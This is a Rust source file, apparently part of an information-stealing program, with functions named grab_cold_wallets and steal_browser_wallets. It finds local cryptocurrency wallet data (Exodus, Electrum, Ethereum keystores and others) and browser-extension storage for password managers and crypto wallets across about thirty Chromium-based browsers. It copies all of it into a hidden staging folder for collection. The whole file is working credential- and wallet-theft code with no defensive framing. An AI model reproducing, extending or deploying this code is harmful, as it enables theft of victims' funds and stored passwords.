use crate::chrome_grabber::dumper::Dumper;
use app_dirs::get_app_dir;
use app_dirs::AppDataType;
use std::collections::HashMap;
use walkdir::WalkDir;

pub fn grab_cold_wallets() {
    let mut hm: HashMap<&str, &str> = HashMap::new();
    hm.insert(
        "AtomicWallet",
        "%APPDATA%\\atomic\\Local Storage\\leveldb\\",
    );
    hm.insert("Exodus", "%APPDATA%\\exodus\\exodus.wallet\\");
    hm.insert(
        "JaxxWallet",
        "%APPDATA%\\Wallets\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\",
    );
    hm.insert("Electrum", "%APPDATA%\\Electrum\\wallets\\");
    hm.insert("ByteCoin", "%APPDATA%\\bytecoin\\");
    hm.insert("Ethereum", "%APPDATA%\\Ethereum\\keystore\\");
    hm.insert("Guarda", "%APPDATA%\\Guarda\\\\Local Storage\\leveldb\\");
    hm.insert("Coinomi", "%APPDATA%\\Coinomi\\Coinomi\\wallets\\");
    hm.insert("Armory", "%APPDATA%\\Armory\\");
    hm.insert("ZCash", "%APPDATA%\\Zcash\\");

    for (key, value) in hm.iter() {
        let string_path = value.replace("%APPDATA%", &std::env::var("APPDATA").unwrap());
        let path = std::path::Path::new(&string_path);
        if path.exists() {
            std::fs::create_dir(format!(
                "{}\\logsxc\\{}\\",
                &std::env::var("LOCALAPPDATA").unwrap(),
                key
            ))
            .unwrap();
            let walker = WalkDir::new(string_path).into_iter();

            for entry in walker {
                let entry = entry.unwrap();
                let _ = std::fs::copy(
                    entry.path(),
                    format!(
                        "{}\\logsxc\\{}\\{}",
                        &std::env::var("LOCALAPPDATA").unwrap(),
                        key,
                        entry.path().file_name().unwrap().to_str().unwrap()
                    ),
                );
            }
        }
    }
}

pub fn steal_browser_wallets() {
    let mut hm = HashMap::new();
    hm.insert("edge", Dumper::new("Edge", "Microsoft"));
    hm.insert("chromium", Dumper::new("", "Chromium"));
    hm.insert("7star", Dumper::new("7Star", "7Star"));
    hm.insert("amigo", Dumper::new("", "Amigo"));
    hm.insert("brave", Dumper::new("Brave-Browser", "BraveSoftware"));
    hm.insert("centbrowser", Dumper::new("", "CentBrowser"));
    hm.insert("chedot", Dumper::new("", "Chedot"));
    hm.insert("chrome_canary", Dumper::new("Chrome SxS", "Google"));
    hm.insert("coccoc", Dumper::new("Browser", "CocCoc"));
    hm.insert("dragon", Dumper::new("Dragon", "Comodo"));
    hm.insert("elements-browser", Dumper::new("", "Elements Browser"));
    hm.insert(
        "epic-privacy-browser",
        Dumper::new("", "Epic Privacy Browser"),
    );
    hm.insert("chrome", Dumper::new("Chrome", "Google"));
    hm.insert("kometa", Dumper::new("", "Kometa"));
    hm.insert("orbitum", Dumper::new("", "Orbitum"));
    hm.insert("sputnik", Dumper::new("Sputnik", "Sputnik"));
    hm.insert("torch", Dumper::new("", "Torch"));
    hm.insert("ucozmedia", Dumper::new("Uran", "uCozMedia"));
    hm.insert("vivaldi", Dumper::new("", "Vivaldi"));
    hm.insert("atom-mailru", Dumper::new("Atom", "Mail.Ru"));
    hm.insert("opera", Dumper::new("Opera Software", "Opera Stable"));
    hm.insert("opera-gx", Dumper::new("Opera Software", "Opera GX Stable"));
    hm.insert("ChromePlus", Dumper::new("MappleStudio", "ChromePlus"));
    hm.insert("Iridium", Dumper::new("Iridium", "Iridium"));
    hm.insert("Iridium", Dumper::new("", "Iridium"));
    hm.insert("fenrir-inc", Dumper::new("sleipnir5", "settings"));
    hm.insert("catalinagroup", Dumper::new("CatalinaGroup", "Citrio"));
    hm.insert("Coowoo", Dumper::new("", "Coowoo"));
    hm.insert("liebao", Dumper::new("", "liebao"));
    hm.insert("qip-surf", Dumper::new("", "Qip Surf"));
    hm.insert("360browser", Dumper::new("360Browser", "Browser"));


    let mut extensions = std::collections::HashMap::new();
 
   extensions.insert("Authenticator", "bhghoamapcdpbohphigoooaddinpkbai");

   extensions.insert("EOS Authenticator", "oeljdldpnmdbchonielidgobddffflal");
   extensions.insert("Bitwarden", "nngceckbapebfimnlniiiahkandclblb");
   extensions.insert("KeePassXC", "oboonakemofpalcgghocfoadofidjkkk");
   extensions.insert("Dashlane", "fdjamakpfbbddfjaooikfcpapjohcfmg");
   extensions.insert("1Password", "aeblfdkhhhdcdjpifhhbdiojplfjncoa");
   extensions.insert("NordPass", "fooolghllnmhmmndgjiamiiodkpenpbb");
   extensions.insert("Keeper", "bfogiafebfohielmmehodmfbbebbbpei");
   extensions.insert("RoboForm", "pnlccmojcmeohlpggmfnbbiapkmbliob");
   extensions.insert("LastPass", "hdokiejnpimakedhajhdlcegeplioahd");
   extensions.insert("BrowserPass", "naepdomgkenhinolocfifgehidddafch");
   extensions.insert("MYKI", "bmikpgodpkclnkgmnpphehdgcimmided");
   extensions.insert("Splikity", "jhfjfclepacoldmjmkmdlmganfaalklb");
   extensions.insert("CommonKey", "chgfefjpcobfbnpmiokfjjaglahmnded");
   extensions.insert("Zoho Vault", "igkpcodhieompeloncfnbekccinhapdb");
   extensions.insert("Norton Password Manager", "admmjipmmciaobhojoghlmleefbicajg");
   extensions.insert("Avira Password Manager", "caljgklbbfbcjjanaijlacgncafpegll");
   extensions.insert("Trezor Password Manager", "imloifkgjagghnncjkhggdhalmcnfklk");

   extensions.insert("MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn");
   extensions.insert("TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec");
   extensions.insert("BinanceChain", "fhbohimaelbohpjbbldcngcnapndodjp");
   extensions.insert("Coin98", "aeachknmefphepccionboohckonoeemg");
   extensions.insert("iWallet", "kncchdigobghenbbaddojjnnaogfppfj");
   extensions.insert("Wombat", "amkmjjmmflddogmhpjloimipbofnfjih");
   extensions.insert("MEW CX", "nlbmnnijcnlegkjjpcfjclmcfggfefdm");
   extensions.insert("NeoLine", "cphhlgmgameodnhkjdmkpanlelnlohao");
   extensions.insert("Terra Station", "aiifbnbfobpmeekipheeijimdpnlpgpp");
   extensions.insert("Keplr", "dmkamcknogkgcdfhhbddcghachkejeap");
   extensions.insert("Sollet", "fhmfendgdocmcbmfikdcogofphimnkno");
   extensions.insert("ICONex", "flpiciilemghbmfalicajoolhkkenfel");
   extensions.insert("KHC", "hcflpincpppdclinealmandijcmnkbgn");
   extensions.insert("TezBox ", "mnfifefkajgofkcjkemidiaecocnkjeh");
   extensions.insert("Byone", "nlgbhdfgdhgbiamfdfmbikcdghidoadd");
   extensions.insert("OneKey", "infeboajgfhgbjpjbeppbkgnabfdkdaf");
   extensions.insert("DAppPlay", "lodccjjbdhfakaekdiahmedfbieldgik");
   extensions.insert("BitClip", "ijmpgkjfkbfhoebgogflfebnmejmfbml");
   extensions.insert("Steem Keychain", "lkcjlnjfpbikmcmbachjpdbijejflpcm");
   extensions.insert("Nash Extension", "onofpnbbkehpmmoabgpcpmigafmmnjhl");
   extensions.insert("Hycon Lite Client", "bcopgchhojmggmffilplmbdicgaihlkp");
   extensions.insert("ZilPay", "klnaejjgbibmhlephnhpmaofohgkpgkd");
   extensions.insert("Leaf Wallet", "cihmoadaighcejopammfbmddcmdekcje");
   extensions.insert("Cyano Wallet", "dkdedlpgdmmkkfjabffeganieamfklkm");
   extensions.insert("Cyano Wallet Pro", "icmkfkmjoklfhlfdkkkgpnpldkgdmhoe");
   extensions.insert("Nabox Wallet", "nknhiehlklippafakaeklbeglecifhad");
   extensions.insert("Polymesh Wallet", "jojhfeoedkpkglbfimdfabpdfjaoolaf");
   extensions.insert("Nifty Wallet", "jbdaocneiiinmjbjlgalhcelgbejmnid");
   extensions.insert("Liquality Wallet", "kpfopkelmapcoipemfendmdcghnegimn");
   extensions.insert("Math Wallet", "afbcbjpbpfadlkmhmclhkeeodmamcflc");
   extensions.insert("Coinbase Wallet", "hnfanknocfeofbddgcijnmhnfnkdnaad");
   extensions.insert("Clover Wallet", "nhnkbkgjikgcigadomkphalanndcapjk");
   extensions.insert("Yoroi", "ffnbelfdoeiohenkjibnmadjiehjhajb");
   extensions.insert("Guarda", "hpglfhgfnhbgpjdenjgmdgoeiappafln");
   extensions.insert("EQUAL Wallet", "blnieiiffboillknjnepogjhkgnoapac");
   extensions.insert("BitApp Wallet", "fihkakfobkmkjojpchpfgcmhfjnmnfpi");
   extensions.insert("Auro Wallet", "cnmamaachppnkjgnildpdmkaakejnhae");
   extensions.insert("Saturn Wallet", "nkddgncdjgjfcddamfgcmfnlhccnimig");
   extensions.insert("Ronin Wallet", "fnjhmkhhmkbjkkabndcnnogagogbneec");


 
    for (name, dumper) in hm {
        let path = get_app_dir(AppDataType::UserCache, &dumper.app_info, "User Data/Default/Local Extension Settings/").unwrap();
        if path.exists() {
            for(extension_name, extension_path) in &extensions {
                let extension_path_str = format!("{}\\{}\\", path.display(), extension_path);
                let extension_path = std::path::Path::new(&extension_path_str);
                if extension_path.exists() {
                    unsafe { crate::WALLETS += 1; }

                    std::fs::create_dir(format!("{}\\logsxc\\{}_{}\\", std::env::var("LOCALAPPDATA").unwrap(), extension_name, name)).unwrap();
                    let walker = WalkDir::new(extension_path_str).into_iter();

                    for entry in walker {
                        let entry = entry.unwrap();
                        let _ = std::fs::copy(
                            entry.path(),
                            format!(
                                "{}\\logsxc\\{}_{}\\{}",
                                &std::env::var("LOCALAPPDATA").unwrap(),
                                extension_name,
                                name,
                                entry.path().file_name().unwrap().to_str().unwrap()
                            ),
                        );
                    }
                }
            }

        }
    }
}
